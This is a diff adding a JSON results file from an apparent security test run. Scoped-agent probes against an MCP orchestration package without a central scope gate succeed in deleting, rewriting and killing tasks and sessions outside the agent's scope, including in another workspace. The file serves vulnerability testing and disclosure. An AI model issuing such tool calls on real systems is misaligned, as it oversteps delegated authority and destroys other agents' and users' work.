@@ -1,0 +1,432 @@
+{
+  "target_ready": true,
+  "execution_status": "completed",
+  "scenario": "attack",
+  "variant": "vulnerable",
+  "driver_sha256": "8e2547eb4ca1ca1458d1745b6eff6f9b0c3bab3cd19b09db7f4c8258dc218103",
+  "upstream": {
+    "package_dir": "/lab/app/node_modules/@grackle-ai/mcp",
+    "package_version": "0.132.1",
+    "scope_enforcement_module_present": true,
+    "central_scope_gate_present": false
+  },
+  "node": {
+    "returncode": 0,
+    "stderr_tail": "",
+    "stdout_tail": ""
+  },
+  "probes": [
+    {
+      "id": "delete_non_descendant_task",
+      "tool": "task_delete",
+      "actor": "scoped",
+      "args": {
+        "taskId": "task-sibling"
+      },
+      "target": "task-sibling",
+      "auth": {
+        "type": "scoped",
+        "taskId": "task-caller",
+        "workspaceId": "ws-alpha",
+        "personaId": "persona-orchestrator"
+      },
+      "tool_permitted": true,
+      "tool_scope": null,
+      "arguments_valid": true,
+      "central_gate_present": false,
+      "gate_denied": false,
+      "gate_error": null,
+      "handler_invoked": true,
+      "handler_is_error": false,
+      "handler_text": "{\n  \"success\": true\n}",
+      "handler_error": null,
+      "backend_effects": [
+        {
+          "method": "orchestration.deleteTask",
+          "request": {
+            "id": "task-sibling"
+          }
+        }
+      ],
+      "backend_state": {
+        "tasks": {
+          "system": {
+            "id": "system",
+            "parentTaskId": "",
+            "workspaceId": "ws-alpha",
+            "title": "Root orchestrator task",
+            "description": "Human-authoritative root of the workspace.",
+            "status": 1
+          },
+          "task-caller": {
+            "id": "task-caller",
+            "parentTaskId": "system",
+            "workspaceId": "ws-alpha",
+            "title": "Attacker-controlled orchestrator task",
+            "description": "The scoped agent that holds the token used in every probe.",
+            "status": 2
+          },
+          "task-caller-child": {
+            "id": "task-caller-child",
+            "parentTaskId": "task-caller",
+            "workspaceId": "ws-alpha",
+            "title": "Legitimate delegated subtask",
+            "description": "A descendant of the caller; operating on it is authorized.",
+            "status": 2
+          },
+          "task-nephew": {
+            "id": "task-nephew",
+            "parentTaskId": "task-sibling",
+            "workspaceId": "ws-alpha",
+            "title": "Subtask of the peer task",
+            "description": "Descendant of the peer, not of the caller.",
+            "status": 1
+          },
+          "task-foreign": {
+            "id": "task-foreign",
+            "parentTaskId": "",
+            "workspaceId": "ws-beta",
+            "title": "Task in another workspace",
+            "description": "Out of the caller's workspace; used to describe the cross-workspace variant.",
+            "status": 1
+          }
+        },
+        "sessions": {
+          "sess-caller": {
+            "id": "sess-caller",
+            "taskId": "task-caller",
+            "status": "running"
+          },
+          "sess-caller-child": {
+            "id": "sess-caller-child",
+            "taskId": "task-caller-child",
+            "status": "running"
+          },
+          "sess-sibling": {
+            "id": "sess-sibling",
+            "taskId": "task-sibling",
+            "status": "running"
+          }
+        }
+      },
+      "error": null
+    },
+    {
+      "id": "update_non_descendant_task",
+      "tool": "task_update",
+      "actor": "scoped",
+      "args": {
+        "taskId": "task-sibling",
+        "title": "rewritten-by-non-ancestor"
+      },
+      "target": "task-sibling",
+      "auth": {
+        "type": "scoped",
+        "taskId": "task-caller",
+        "workspaceId": "ws-alpha",
+        "personaId": "persona-orchestrator"
+      },
+      "tool_permitted": true,
+      "tool_scope": null,
+      "arguments_valid": true,
+      "central_gate_present": false,
+      "gate_denied": false,
+      "gate_error": null,
+      "handler_invoked": true,
+      "handler_is_error": false,
+      "handler_text": "{\n  \"id\": \"task-sibling\",\n  \"parentTaskId\": \"system\",\n  \"workspaceId\": \"ws-alpha\",\n  \"title\": \"rewritten-by-non-ancestor\",\n  \"description\": \"Shares a parent with the caller but is not its descendant.\",\n  \"status\": 2\n}",
+      "handler_error": null,
+      "backend_effects": [
+        {
+          "method": "orchestration.updateTask",
+          "request": {
+            "id": "task-sibling",
+            "title": "rewritten-by-non-ancestor",
+            "description": "",
+            "status": 0,
+            "dependsOn": [],
+            "sessionId": ""
+          }
+        }
+      ],
+      "backend_state": {
+        "tasks": {
+          "system": {
+            "id": "system",
+            "parentTaskId": "",
+            "workspaceId": "ws-alpha",
+            "title": "Root orchestrator task",
+            "description": "Human-authoritative root of the workspace.",
+            "status": 1
+          },
+          "task-caller": {
+            "id": "task-caller",
+            "parentTaskId": "system",
+            "workspaceId": "ws-alpha",
+            "title": "Attacker-controlled orchestrator task",
+            "description": "The scoped agent that holds the token used in every probe.",
+            "status": 2
+          },
+          "task-caller-child": {
+            "id": "task-caller-child",
+            "parentTaskId": "task-caller",
+            "workspaceId": "ws-alpha",
+            "title": "Legitimate delegated subtask",
+            "description": "A descendant of the caller; operating on it is authorized.",
+            "status": 2
+          },
+          "task-sibling": {
+            "id": "task-sibling",
+            "parentTaskId": "system",
+            "workspaceId": "ws-alpha",
+            "title": "rewritten-by-non-ancestor",
+            "description": "Shares a parent with the caller but is not its descendant.",
+            "status": 2
+          },
+          "task-nephew": {
+            "id": "task-nephew",
+            "parentTaskId": "task-sibling",
+            "workspaceId": "ws-alpha",
+            "title": "Subtask of the peer task",
+            "description": "Descendant of the peer, not of the caller.",
+            "status": 1
+          },
+          "task-foreign": {
+            "id": "task-foreign",
+            "parentTaskId": "",
+            "workspaceId": "ws-beta",
+            "title": "Task in another workspace",
+            "description": "Out of the caller's workspace; used to describe the cross-workspace variant.",
+            "status": 1
+          }
+        },
+        "sessions": {
+          "sess-caller": {
+            "id": "sess-caller",
+            "taskId": "task-caller",
+            "status": "running"
+          },
+          "sess-caller-child": {
+            "id": "sess-caller-child",
+            "taskId": "task-caller-child",
+            "status": "running"
+          },
+          "sess-sibling": {
+            "id": "sess-sibling",
+            "taskId": "task-sibling",
+            "status": "running"
+          }
+        }
+      },
+      "error": null
+    },
+    {
+      "id": "kill_sibling_session",
+      "tool": "session_kill",
+      "actor": "scoped",
+      "args": {
+        "sessionId": "sess-sibling"
+      },
+      "target": "sess-sibling",
+      "auth": {
+        "type": "scoped",
+        "taskId": "task-caller",
+        "workspaceId": "ws-alpha",
+        "personaId": "persona-orchestrator"
+      },
+      "tool_permitted": true,
+      "tool_scope": null,
+      "arguments_valid": true,
+      "central_gate_present": false,
+      "gate_denied": false,
+      "gate_error": null,
+      "handler_invoked": true,
+      "handler_is_error": false,
+      "handler_text": "{\n  \"success\": true\n}",
+      "handler_error": null,
+      "backend_effects": [
+        {
+          "method": "core.killAgent",
+          "request": {
+            "id": "sess-sibling",
+            "graceful": false
+          }
+        }
+      ],
+      "backend_state": {
+        "tasks": {
+          "system": {
+            "id": "system",
+            "parentTaskId": "",
+            "workspaceId": "ws-alpha",
+            "title": "Root orchestrator task",
+            "description": "Human-authoritative root of the workspace.",
+            "status": 1
+          },
+          "task-caller": {
+            "id": "task-caller",
+            "parentTaskId": "system",
+            "workspaceId": "ws-alpha",
+            "title": "Attacker-controlled orchestrator task",
+            "description": "The scoped agent that holds the token used in every probe.",
+            "status": 2
+          },
+          "task-caller-child": {
+            "id": "task-caller-child",
+            "parentTaskId": "task-caller",
+            "workspaceId": "ws-alpha",
+            "title": "Legitimate delegated subtask",
+            "description": "A descendant of the caller; operating on it is authorized.",
+            "status": 2
+          },
+          "task-sibling": {
+            "id": "task-sibling",
+            "parentTaskId": "system",
+            "workspaceId": "ws-alpha",
+            "title": "Peer task owned by another agent",
+            "description": "Shares a parent with the caller but is not its descendant.",
+            "status": 2
+          },
+          "task-nephew": {
+            "id": "task-nephew",
+            "parentTaskId": "task-sibling",
+            "workspaceId": "ws-alpha",
+            "title": "Subtask of the peer task",
+            "description": "Descendant of the peer, not of the caller.",
+            "status": 1
+          },
+          "task-foreign": {
+            "id": "task-foreign",
+            "parentTaskId": "",
+            "workspaceId": "ws-beta",
+            "title": "Task in another workspace",
+            "description": "Out of the caller's workspace; used to describe the cross-workspace variant.",
+            "status": 1
+          }
+        },
+        "sessions": {
+          "sess-caller": {
+            "id": "sess-caller",
+            "taskId": "task-caller",
+            "status": "running"
+          },
+          "sess-caller-child": {
+            "id": "sess-caller-child",
+            "taskId": "task-caller-child",
+            "status": "running"
+          },
+          "sess-sibling": {
+            "id": "sess-sibling",
+            "taskId": "task-sibling",
+            "status": "killed"
+          }
+        }
+      },
+      "error": null
+    },
+    {
+      "id": "delete_cross_workspace_task",
+      "tool": "task_delete",
+      "actor": "scoped",
+      "args": {
+        "taskId": "task-foreign"
+      },
+      "target": "task-foreign",
+      "auth": {
+        "type": "scoped",
+        "taskId": "task-caller",
+        "workspaceId": "ws-alpha",
+        "personaId": "persona-orchestrator"
+      },
+      "tool_permitted": true,
+      "tool_scope": null,
+      "arguments_valid": true,
+      "central_gate_present": false,
+      "gate_denied": false,
+      "gate_error": null,
+      "handler_invoked": true,
+      "handler_is_error": false,
+      "handler_text": "{\n  \"success\": true\n}",
+      "handler_error": null,
+      "backend_effects": [
+        {
+          "method": "orchestration.deleteTask",
+          "request": {
+            "id": "task-foreign"
+          }
+        }
+      ],
+      "backend_state": {
+        "tasks": {
+          "system": {
+            "id": "system",
+            "parentTaskId": "",
+            "workspaceId": "ws-alpha",
+            "title": "Root orchestrator task",
+            "description": "Human-authoritative root of the workspace.",
+            "status": 1
+          },
+          "task-caller": {
+            "id": "task-caller",
+            "parentTaskId": "system",
+            "workspaceId": "ws-alpha",
+            "title": "Attacker-controlled orchestrator task",
+            "description": "The scoped agent that holds the token used in every probe.",
+            "status": 2
+          },
+          "task-caller-child": {
+            "id": "task-caller-child",
+            "parentTaskId": "task-caller",
+            "workspaceId": "ws-alpha",
+            "title": "Legitimate delegated subtask",
+            "description": "A descendant of the caller; operating on it is authorized.",
+            "status": 2
+          },
+          "task-sibling": {
+            "id": "task-sibling",
+            "parentTaskId": "system",
+            "workspaceId": "ws-alpha",
+            "title": "Peer task owned by another agent",
+            "description": "Shares a parent with the caller but is not its descendant.",
+            "status": 2
+          },
+          "task-nephew": {
+            "id": "task-nephew",
+            "parentTaskId": "task-sibling",
+            "workspaceId": "ws-alpha",
+            "title": "Subtask of the peer task",
+            "description": "Descendant of the peer, not of the caller.",
+            "status": 1
+          }
+        },
+        "sessions": {
+          "sess-caller": {
+            "id": "sess-caller",
+            "taskId": "task-caller",
+            "status": "running"
+          },
+          "sess-caller-child": {
+            "id": "sess-caller-child",
+            "taskId": "task-caller-child",
+            "status": "running"
+          },
+          "sess-sibling": {
+            "id": "sess-sibling",
+            "taskId": "task-sibling",
+            "status": "running"
+          }
+        }
+      },
+      "error": null
+    }
+  ],
+  "error": null,
+  "schema_version": 1,
+  "context": {
+    "schema_version": 1,
+    "run_id": "20260927T050954Z-216b9940664b",
+    "case_id": "02-vulnerable-attack",
+    "variant": "vulnerable",
+    "scenario": "attack"
+  }
+}
